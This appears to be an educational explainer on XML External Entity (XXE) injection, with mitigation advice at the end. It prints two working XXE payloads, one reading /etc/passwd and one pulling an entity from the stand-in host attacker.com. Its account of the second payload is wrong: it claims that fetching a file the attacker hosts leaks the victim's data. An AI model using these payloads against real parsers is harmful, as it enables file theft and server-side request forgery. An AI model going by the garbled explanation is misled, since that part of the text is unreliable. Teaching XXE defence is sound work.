# 🟨 XXE - XML External Entity Injection

XXE (XML External Entity) Injection is a type of attack against web applications that parse XML input. It occurs when an attacker can influence the processing of XML input, leading to disclosure of confidential data, denial of service, server-side request forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts.

Here's an explanation of XXE with an example:

Suppose you have a web application that accepts XML input to process user data:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

In this example, the XML document defines an external entity named `xxe` that references the file `/etc/passwd`. When the XML parser processes the document, it resolves the external entity `xxe` and substitutes its value with the contents of the specified file (`/etc/passwd`).

An attacker can exploit this vulnerability by submitting a malicious XML input containing an external entity that references sensitive files, such as system configuration files or application source code.

For example, an attacker could craft a malicious XML input like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe.txt">
]>
<data>&xxe;</data>
```

In this case, the attacker hosts a file (`xxe.txt`) on their server (`http://attacker.com/xxe.txt`) containing sensitive information. When the vulnerable web application processes the XML input, it fetches the contents of the external entity `xxe` from the attacker's server and includes it in the response, potentially leaking sensitive data to the attacker.

Additionally, XXE vulnerabilities can also lead to other types of attacks, such as SSRF (Server-Side Request Forgery) and DoS (Denial of Service), depending on the capabilities of the XML parser and the context in which it is used.

To mitigate XXE vulnerabilities, developers should:

* Disable external entity processing in XML parsers or use secure XML processing libraries that prevent XXE attacks.
* Validate and sanitize XML input to ensure it does not contain external entity references or other potentially malicious content.
* Use whitelists or allowlists to restrict the types of XML elements and attributes that the application can process.
* Perform security testing, including vulnerability scanning and penetration testing, to identify and remediate XXE vulnerabilities in web applications.
